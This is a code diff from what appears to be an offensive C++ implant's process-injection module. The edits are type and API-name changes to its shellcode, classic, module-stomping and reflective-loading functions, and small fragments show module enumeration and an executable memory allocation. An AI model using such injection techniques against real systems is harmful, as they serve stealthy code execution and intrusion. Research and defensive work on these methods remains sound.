@@ -2,7 +2,7 @@
 
 auto DECLFN Injection::Shellcode(
     _In_ ULONG ProcessID,
-    _In_ PBYTE Buffer,
+    _In_ BYTE* Buffer,
     _In_ UPTR  Size,
     _In_ PVOID Param
 ) -> BOOL {
@@ -30,7 +30,7 @@ auto DECLFN Injection::Shellcode(
 
 auto DECLFN Injection::Classic(
     _In_  ULONG   ProcessID,
-    _In_  PBYTE   Buffer,
+    _In_  BYTE*   Buffer,
     _In_  UPTR    Size,
     _In_  PVOID   Param,
     _Out_ PVOID*  Base
@@ -73,7 +73,7 @@ _KH_END:
 
 auto DECLFN Injection::Stomp(
     _In_  ULONG   ProcessID,
-    _In_  PBYTE   Buffer,
+    _In_  BYTE*   Buffer,
     _In_  UPTR    Size,
     _In_  PVOID   Param,
     _Out_ PVOID*  Base
@@ -119,7 +119,7 @@ auto DECLFN Injection::Stomp(
             for ( INT i = 0; i < ( Needed / sizeof( HMODULE ) ); i++ ) {
                 CHAR ModName[MAX_PATH] = { 0 };
 
-                Self->Krnl32.GetModuleFileNameExA( 
+                Self->Krnl32.K32GetModuleFileNameExA( 
                     PsHandle, Modules[i], ModName, ( sizeof( ModName ) / sizeof( CHAR ) ) 
                 );
                 
@@ -179,18 +179,18 @@ auto DECLFN Injection::Stomp(
 }
 
 auto DECLFN Injection::Reflection(
-    _In_ PBYTE  Buffer,
+    _In_ BYTE*  Buffer,
     _In_ ULONG  Size,
     _In_ PVOID  Param
 ) -> BOOL {
-    PBYTE  ImgBase = NULL;
+    BYTE*  ImgBase = NULL;
     ULONG  ImgSize = 0;
     UPTR   Delta   = 0;
     BOOL   IsDll   = FALSE;
     PWCH*  Argv    = NULL;
     INT    Argc    = 0;
 
-    PULONG Reads     = { 0 };
+    ULONG* Reads     = { 0 };
     HWND   WinHandle = NULL;
     HANDLE BackupOut = INVALID_HANDLE_VALUE;
     HANDLE PipeRead  = INVALID_HANDLE_VALUE;
@@ -218,7 +218,7 @@ auto DECLFN Injection::Reflection(
     KhDbg( "parsed pe" );
     KhDbg( "is %s", IsDll ? "DLL" : "EXE" );
 
-    ImgBase = (PBYTE)Self->Mm->Alloc( nullptr, NULL, ImgSize, MEM_COMMIT | MEM_RESERVE, 0x40 );
+    ImgBase = (BYTE*)Self->Mm->Alloc( nullptr, NULL, ImgSize, MEM_COMMIT | MEM_RESERVE, 0x40 );
     Delta   = U_PTR( ImgBase ) - Header->OptionalHeader.ImageBase;
 
     KhDbg( "allocated to %p [%d bytes]", ImgBase, Size );
